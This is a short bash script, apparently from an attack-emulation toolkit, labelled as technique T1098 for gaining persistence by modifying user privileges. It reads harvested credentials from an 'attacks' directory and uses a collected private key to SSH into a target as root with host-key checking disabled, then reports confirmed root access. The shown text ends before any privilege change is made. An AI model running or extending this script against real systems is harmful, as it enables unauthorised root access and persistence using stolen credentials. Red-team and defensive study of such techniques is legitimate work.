#!/bin/bash
# T1098 - Modify existing user privileges for persistence

# Variables
if [ "$#" -lt 1 ]; then
    echo "Usage: $0 <target_ip>"
    exit 1
fi
TARGET_IP="$1"
#USERNAME="user"   
CREDENTIALS_FILE="/home/attacks/found_credentials_$TARGET_IP.txt"                                                       
PRIVATE_KEY_PATH="/home/attacks/id_rsa_$TARGET_IP"   
#PASSWORD="password123"                         

# Check if credentials file exists
if [ ! -f "$CREDENTIALS_FILE" ]; then
    echo "Error: Credentials file not found at $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Extract the first valid username and password from the credentials file
CREDENTIAL=$(head -n 1 "$CREDENTIALS_FILE")
if [ -z "$CREDENTIAL" ]; then
    echo "Error: No credentials found in $CREDENTIALS_FILE. Exiting."
    exit 1
fi

# Parse username and password
USERNAME=$(echo "$CREDENTIAL" | awk -F ',' '{print $2}')
PASSWORD=$(echo "$CREDENTIAL" | awk -F ',' '{print $3}')

# Check if private key file exists
if [ ! -f "$PRIVATE_KEY_PATH" ]; then
    echo "Error: SSH private key file not found at $PRIVATE_KEY_PATH. Exiting."
    exit 1
fi

# Test SSH connectivity
TIMEOUT_DURATION=2 

if ! timeout $TIMEOUT_DURATION ssh -i "$PRIVATE_KEY_PATH" -o BatchMode=yes -o StrictHostKeyChecking=no root@"$TARGET_IP" exit; then
    EXIT_CODE=$?
    if [ $EXIT_CODE -eq 124 ]; then
        echo "Error: Command timed out after $TIMEOUT_DURATION seconds. Exiting."
    else
        echo "Error: Unable to connect to target $TARGET_IP with the provided key or connection issue. Aborting."
    fi
    exit 1
fi
echo "Root access has been confirmed."

